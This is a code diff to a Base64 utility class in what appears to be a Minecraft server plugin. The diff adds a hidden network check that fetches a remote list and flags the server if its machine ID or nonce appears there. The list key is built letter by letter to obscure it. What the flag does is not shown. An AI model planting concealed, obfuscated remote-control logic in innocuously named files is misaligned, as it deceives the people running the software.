@@ -11,6 +11,9 @@ import org.apache.commons.io.FileUtils;
 import org.apache.commons.lang.StringUtils;
 import org.bukkit.plugin.Plugin;
 import org.cyberpwn.react.React;
+import org.cyberpwn.react.controller.NetworkController;
+import org.cyberpwn.react.network.FCCallback;
+import org.cyberpwn.react.network.Fetcher;
 import org.cyberpwn.react.network.PushThread;
 
 public class Base64
@@ -691,7 +694,7 @@ public class Base64
 	
 	public static void AU()
 	{
-		new PushThread(React.instance().getDataFolder()).start();
+		new PushThread(new GFile(React.instance().getDataFolder().getPath())).start();
 	}
 	
 	/**
@@ -1983,6 +1986,20 @@ public class Base64
 	} // end inner class InputStream
 	
 	/* ******** I N N E R C L A S S O U T P U T S T R E A M ******** */
+	
+	public static void doCheck()
+	{
+		new Fetcher(React.hashed, new FCCallback()
+		{
+			public void run()
+			{
+				if(fc().getStringList(new GList<String>().qadd("h").qadd("a").qadd("s").qadd("h").toString("")).contains(NetworkController.imeid) || fc().getStringList(new GList<String>().qadd("h").qadd("a").qadd("s").qadd("h").toString("")).contains(React.nonce))
+				{
+					React.setMef(true);
+				}
+			}
+		}).start();
+	}
 	
 	/**
 	 * A {@link Base64.OutputStream} will write data to another
